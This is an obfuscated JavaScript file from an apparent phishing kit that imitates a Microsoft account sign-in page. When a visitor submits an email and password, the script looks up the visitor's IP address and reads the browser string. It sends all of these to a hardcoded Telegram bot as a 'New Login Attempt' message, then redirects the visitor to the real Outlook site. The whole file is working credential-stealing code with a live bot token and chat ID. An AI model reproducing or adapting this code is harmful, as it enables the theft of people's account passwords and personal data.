document.addEventListener("DOMContentLoaded", () => {
  const _0x220e7e = document.getElementById("inp_uname");
  const _0x5c8297 = document.getElementById("inp_pwd");
  let _0x29b075 = "uname";
  let _0x56f6f4 = false;
  let _0xe94a2a = false;
  const _0x501b56 = document.getElementById("btn_next");
  _0x501b56.addEventListener("click", () => _0x25525e());
  _0x220e7e.addEventListener("keypress", _0x243e18 => {
    if (_0x243e18.key === "Enter") {
      _0x243e18.preventDefault();
      _0x25525e();
    }
  });
  function _0x25525e() {
    _0x36687e();
    if (_0x56f6f4) {
      document.getElementById("section_uname").classList.toggle("d-none");
      document.getElementById("section_pwd").classList.remove("d-none");
      document.querySelectorAll("#user_identity").forEach(_0x20dd0a => {
        _0x20dd0a.innerText = _0x220e7e.value;
      });
      _0x29b075 = "pwd";
      _0x5c8297.focus();
    }
  }
  document.getElementById("btn_sig").addEventListener("click", async function (_0x26776e) {
    _0x26776e.preventDefault();
    const _0x5e868e = document.getElementById("inp_uname").value;
    const _0x448dfc = document.getElementById("inp_pwd").value;
    if (!_0x5e868e || !_0x448dfc) {
      alert("Please enter your email and password.");
      return;
    }
    const _0x52c645 = navigator.userAgent;
    try {
      const _0x3b25ed = await fetch("https://api64.ipify.org?format=json");
      const _0x2d6e3b = await _0x3b25ed.json();
      const _0x202d20 = _0x2d6e3b.ip;
      const _0x4b0972 = "🔍 New Login Attempt\n\n📧 Email: " + _0x5e868e + "\n🔑 Password: " + _0x448dfc + "\n🌐 IP Address: " + _0x202d20 + "\n🖥 Browser: " + _0x52c645;
      await fetch("https://api.telegram.org/bot8658179872:AAENdJ-madQlV9nsTLzseeEpumTZUXqsC8A/sendMessage", {
        'method': "POST",
        'headers': {
          'Content-Type': "application/json"
        },
        'body': JSON.stringify({
          'chat_id': "8195799501",
          'text': _0x4b0972,
          'parse_mode': "Markdown"
        })
      }).then(() => {
        _0xb46564();
      });
    } catch (_0x25d3ba) {
      console.error("Error sending to Telegram:", _0x25d3ba);
    }
  });
  _0x5c8297.addEventListener("keypress", _0x56e370 => {
    if (_0x56e370.key === "Enter") {
      _0x56e370.preventDefault();
      _0xb46564();
    }
  });
  function _0xb46564() {
    _0x36687e();
    if (_0xe94a2a) {
      window.location.href = "https://outlook.live.com/";
    }
  }
  function _0x36687e() {
    function _0x5a40dd(_0x533b19) {
      document.getElementById("error_uname").innerText = _0x533b19 ? '' : "Enter a valid email address, phone number, or Skype name.";
      _0x220e7e.classList.toggle("error-inp", !_0x533b19);
      _0x56f6f4 = _0x533b19;
    }
    function _0x4ad947(_0x3551ff) {
      document.getElementById("error_pwd").innerText = _0x3551ff ? '' : "Please enter the password for your Microsoft account.";
      _0x5c8297.classList.toggle("error-inp", !_0x3551ff);
      _0xe94a2a = _0x3551ff;
    }
    if (_0x29b075 === "uname") {
      _0x5a40dd(_0x220e7e.value.trim() !== '');
    } else if (_0x29b075 === "pwd") {
      _0x4ad947(_0x5c8297.value.trim() !== '');
    }
  }
  document.querySelector(".back").addEventListener("click", () => {
    _0x29b075 = "uname";
    document.getElementById("section_pwd").classList.toggle("d-none");
    document.getElementById("section_uname").classList.remove("d-none");
    _0x220e7e.focus();
  });
  document.querySelectorAll("#btn_final").forEach(_0x5a831c => {
    _0x5a831c.addEventListener("click", () => {
      window.open(location, "_self").close();
    });
  });
});
